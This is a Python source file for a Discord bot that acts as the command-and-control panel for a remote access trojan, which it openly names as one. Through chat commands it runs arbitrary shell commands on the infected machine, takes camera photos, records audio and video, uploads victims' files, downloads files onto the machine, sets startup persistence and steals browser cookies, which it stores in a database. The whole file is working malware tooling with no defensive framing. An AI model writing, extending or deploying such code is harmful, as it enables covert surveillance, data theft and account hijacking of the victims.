import os
import sqlite3
import json
import asyncio
import aiohttp
from datetime import datetime
import discord
from discord.ext import commands
from dotenv import load_dotenv

# Load environment variables (Discord token, RAT endpoint, etc.)
load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_BOT_TOKEN")
RAT_ENDPOINT = os.getenv("RAT_ENDPOINT", "http://localhost:8080/execute")
AUTH_TOKEN = os.getenv("RAT_AUTH_TOKEN", "changeme")
COMMAND_PREFIX = os.getenv("COMMAND_PREFIX", "!")
# Optional Ngrok support: discover public URL if enabled
USE_NGROK = os.getenv("USE_NGROK", "false").lower() == "true"
if USE_NGROK:
    try:
        import urllib.request, json as _json
        with urllib.request.urlopen("http://127.0.0.1:4040/api/tunnels") as resp:
            data = _json.load(resp)
            public_url = data.get("tunnels", [{}])[0].get("public_url")
            if public_url:
                RAT_ENDPOINT = f"{public_url}/execute"
                print(f"[Ngrok] Using public endpoint: {RAT_ENDPOINT}")
    except Exception as e:
        print(f"[Ngrok] Could not determine public endpoint: {e}")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"{bot.user} has connected to Discord!")

async def forward_command(command_str: str) -> dict:
    """Send the command to the RAT client via HTTP POST and return the JSON response."""
    headers = {"Authorization": f"Bearer {AUTH_TOKEN}", "Content-Type": "application/json"}
    payload = {"command": command_str}
    async with aiohttp.ClientSession() as session:
        async with session.post(RAT_ENDPOINT, headers=headers, json=payload) as resp:
            try:
                data = await resp.json()
            except Exception:
                text = await resp.text()
                data = {"error": f"Failed to parse JSON response: {text}"}
            return data

@bot.event
async def on_message(message):
    # Ignore messages from the bot itself
    if message.author == bot.user:
        return

    # Process only messages that start with the command prefix
    if not message.content.startswith(COMMAND_PREFIX):
        return

    # Kill command to shut down the RAT client (now !killclient)
    if message.content.strip() == f"{COMMAND_PREFIX}killclient":
        max_attempts = 3
        for attempt in range(1, max_attempts + 1):
            shutdown_resp = await forward_command("shutdown")
            if shutdown_resp.get("error"):
                if attempt < max_attempts:
                    await asyncio.sleep(1)
                    continue
                else:
                    await message.channel.send(f"Failed to shutdown RAT client after {max_attempts} attempts: {shutdown_resp['error']}")
                    break
            else:
                await message.channel.send("RAT client shutdown successful.")
                break
        return

    # Kill command to shut down only the Discord bot (!killbot)
    if message.content.strip() == f"{COMMAND_PREFIX}killbot":
        await message.channel.send("Shutting down Discord bot.")
        await bot.close()
        return

    # Force kill command to shutdown RAT client and bot regardless of response (!forcekill)
    if message.content.strip() == f"{COMMAND_PREFIX}forcekill":
        # Send shutdown command without checking response
        await forward_command("shutdown")
        await message.channel.send("Force shutdown command sent. Shutting down Discord bot.")
        await bot.close()
        return

    # Test connection command to verify communication with the RAT client
    if message.content.strip() == f"{COMMAND_PREFIX}testconnection":
        test_resp = await forward_command("echo testconnection")
        if "error" in test_resp:
            await message.channel.send(f"Connection test failed: {test_resp.get('error')}")
        else:
            await message.channel.send("Connection test succeeded.")
        return

    # Kill command to shut down both the RAT client and the Discord bot (!kill)
    if message.content.strip() == f"{COMMAND_PREFIX}kill":
        max_attempts = 3
        for attempt in range(1, max_attempts + 1):
            shutdown_resp = await forward_command("shutdown")
            if shutdown_resp.get("error"):
                if attempt < max_attempts:
                    await asyncio.sleep(1)  # wait before retry
                    continue
                else:
                    await message.channel.send(f"Failed to shutdown RAT client after {max_attempts} attempts: {shutdown_resp['error']}")
                    break
            else:
                await message.channel.send("RAT client shutdown successful. Shutting down Discord bot.")
                break
        # Gracefully close the bot
        await bot.close()
        return

    # Ensure shutdown command to force shutdown until success (!ensureshutdown)
    if message.content.strip() == f"{COMMAND_PREFIX}ensureshutdown":
        max_attempts = 5
        for attempt in range(1, max_attempts + 1):
            shutdown_resp = await forward_command("shutdown")
            if shutdown_resp.get("error"):
                await message.channel.send(f"Attempt {attempt}/{max_attempts} failed: {shutdown_resp['error']}")
                await asyncio.sleep(1)
                continue
            else:
                await message.channel.send("RAT client shutdown successful.")
                break
        else:
            await message.channel.send("Failed to shutdown RAT client after multiple attempts.")
        await bot.close()
        return
    # Persistence command to toggle startup persistence (!persistence on/off)
    if message.content.startswith(f"{COMMAND_PREFIX}persistence"):
        parts = message.content.split(maxsplit=1)
        if len(parts) != 2 or parts[1].lower() not in ("on", "off"):
            await message.channel.send(f"Usage: {COMMAND_PREFIX}persistence <on|off>")
            return
        state = parts[1].lower()
        resp = await forward_command(f"persistence {state}")
        if "error" in resp:
            await message.channel.send(f"Persistence command failed: {resp['error']}")
        else:
            await message.channel.send(f"Persistence set to {state}.")
        return

    # Help command to list available commands or detailed usage
    if message.content.startswith(f"{COMMAND_PREFIX}help"):
        # Remove prefix and split arguments
        parts = message.content.split(maxsplit=1)
        if len(parts) == 1:
            help_text = (
            "**Available commands:**\n"
            f"{COMMAND_PREFIX}killclient - Shut down the RAT client only.\n"
            f"{COMMAND_PREFIX}kill - Shut down both the RAT client and this Discord bot.\n"
            f"{COMMAND_PREFIX}killbot - Shut down the Discord bot only.\n"
            f"{COMMAND_PREFIX}persistence <on|off> - Toggle persistence on/off.\n"
            f"{COMMAND_PREFIX}testconnection - Test connection to the RAT client.\n"
            f"{COMMAND_PREFIX}shell <command> - Execute a shell command on the RAT client.\n"
            f"{COMMAND_PREFIX}snap - Capture a photo from the camera.\n"
            f"{COMMAND_PREFIX}record <start|stop> [audio|video|both] - Record audio/video.\n"
            f"{COMMAND_PREFIX}url <url> - Open a URL in the default browser.\n"
            f"{COMMAND_PREFIX}upload <file_path> - Upload a file from the client.\n"
            f"{COMMAND_PREFIX}download <url> <dest_path> - Download a file to the client.\n"
            f"{COMMAND_PREFIX}cookiegrab <url> - Retrieve cookies from a given URL.\n"
            f"{COMMAND_PREFIX}cookieslist - List stored cookie sites.\n"
            f"{COMMAND_PREFIX}help [command] - Show this help or detailed usage."
            )
            await message.channel.send(help_text)
        else:
            cmd = parts[1].strip().lower()
            details = {
                "killclient": f"Usage: {COMMAND_PREFIX}killclient\nExample: {COMMAND_PREFIX}killclient – shuts down the RAT client.",
                "kill": f"Usage: {COMMAND_PREFIX}kill\nExample: {COMMAND_PREFIX}kill – shuts down the RAT client and the Discord bot.",
                "killbot": f"Usage: {COMMAND_PREFIX}killbot\nExample: {COMMAND_PREFIX}killbot – shuts down the Discord bot only.",
                "persistence": f"Usage: {COMMAND_PREFIX}persistence <on|off>\nExample: {COMMAND_PREFIX}persistence on – enables persistence.",
                "testconnection": f"Usage: {COMMAND_PREFIX}testconnection\nExample: {COMMAND_PREFIX}testconnection – tests connection to the RAT client.",
                "shell": f"Usage: {COMMAND_PREFIX}shell <command>\nExample: {COMMAND_PREFIX}shell whoami – runs `whoami` on the RAT client.",
                "help": f"Usage: {COMMAND_PREFIX}help [command]\nExample: {COMMAND_PREFIX}help killclient – shows detailed help for `killclient`."
            }
            await message.channel.send(details.get(cmd, "Command not recognized. Use !help to see available commands."))
        # (no return here to allow further command processing)

    # Cookie grab command to retrieve cookies from a given URL (!cookiegrab <url>)
    if message.content.startswith(f"{COMMAND_PREFIX}cookiegrab ") or message.content.startswith(f"{COMMAND_PREFIX}cookie grab "):
        # Determine URL based on which prefix was used
        if message.content.startswith(f"{COMMAND_PREFIX}cookiegrab "):
            url = message.content[len(f"{COMMAND_PREFIX}cookiegrab "):].strip()
        else:
            url = message.content[len(f"{COMMAND_PREFIX}cookie grab "):].strip()
        if not url:
            await message.channel.send("Usage: !cookiegrab <url>")
            # (no return here to allow further command processing)
            # Continue processing
        # Forward command to RAT client
        resp = await forward_command(f"cookiegrab {url}")
        if "error" in resp:
            await message.channel.send(f"Error retrieving cookies: {resp['error']}")
            return
        cookies = resp.get("cookies", "")
        # Store cookies in SQLite DB
        try:
            conn = sqlite3.connect('cookies.db')
            c = conn.cursor()
            c.execute('CREATE TABLE IF NOT EXISTS cookies (site TEXT PRIMARY KEY, data TEXT)')
            c.execute('INSERT OR REPLACE INTO cookies (site, data) VALUES (?, ?)', (url, cookies))
            conn.commit()
            conn.close()
            await message.channel.send(f"Cookies for {url} stored successfully.")
        except Exception as e:
            await message.channel.send(f"Failed to store cookies: {e}")
        return

    # Cookies list command to list all stored sites (!cookieslist)
    if message.content.strip() == f"{COMMAND_PREFIX}cookieslist":
        try:
            conn = sqlite3.connect('cookies.db')
            c = conn.cursor()
            c.execute('SELECT site FROM cookies')
            rows = c.fetchall()
            conn.close()
            if not rows:
                await message.channel.send("No cookies stored.")
            else:
                sites = ", ".join([row[0] for row in rows])
                await message.channel.send(f"Stored cookie sites: {sites}")
        except Exception as e:
            await message.channel.send(f"Failed to retrieve cookie list: {e}")
        return

    # Determine which command to forward based on the prefix
    cmd = message.content.strip()
    if cmd.startswith(f"{COMMAND_PREFIX}snap"):
        command_body = "snap"
    elif cmd.startswith(f"{COMMAND_PREFIX}record "):
        parts = cmd.split()
        if len(parts) >= 3 and parts[1].lower() == "start":
            mode = parts[2].lower()
            if mode in ("audio", "video", "both"):
                command_body = f"record start {mode}"
            else:
                await message.channel.send("Invalid record start option. Use audio, video, or both.")
                return
        elif len(parts) >= 2 and parts[1].lower() == "stop":
            command_body = "record stop"
        else:
            await message.channel.send("Invalid record command. Use '!record start <audio|video|both>' or '!record stop'.")
            return
    elif cmd.startswith(f"{COMMAND_PREFIX}url "):
        arg = cmd[len(f"{COMMAND_PREFIX}url "):].strip()
        command_body = f"url {arg}"
    elif cmd.startswith(f"{COMMAND_PREFIX}upload "):
        arg = cmd[len(f"{COMMAND_PREFIX}upload "):].strip()
        command_body = f"upload {arg}"
    elif cmd.startswith(f"{COMMAND_PREFIX}download "):
        arg = cmd[len(f"{COMMAND_PREFIX}download "):].strip()
        command_body = f"download {arg}"
    elif cmd.startswith(f"{COMMAND_PREFIX}shell "):
        command_body = cmd[len(f"{COMMAND_PREFIX}shell "):].strip()
    else:
        await message.channel.send("Invalid command format. Use !snap, !record start <audio|video|both>, !record stop, !url <url>, !upload <path>, !download <url> <dest>, or !shell <command>.")
        return

    if not command_body:
        await message.channel.send("No command provided.")
        return

    # Forward the command to the RAT client
    response = await forward_command(command_body)

    # Prepare a response message
    if "error" in response:
        reply = f"Error: {response['error']}"
    else:
        success = response.get("success", False)
        output = response.get("output", "")
        reply = f"**Command:** `{command_body}`\n**Success:** {success}\n`{output}`"

    # Discord has a character limit per message; truncate if necessary
    if len(reply) > 1900:
        reply = reply[:1900] + "... (truncated)"

    await message.channel.send(reply)

# Run the bot
if __name__ == "__main__":
    # Verify that the Discord token appears valid (basic format check)
    if not DISCORD_TOKEN:
        raise EnvironmentError("DISCORD_BOT_TOKEN not set in .env")
    # Basic validation: Discord bot tokens are three parts separated by '.' and should not contain placeholder text
    if "YOUR_DISCORD_BOT_TOKEN" in DISCORD_TOKEN or DISCORD_TOKEN.count(".") != 2:
        raise EnvironmentError("DISCORD_BOT_TOKEN appears invalid. Please replace it with a real token from the Discord Developer Portal.")
    bot.run(DISCORD_TOKEN)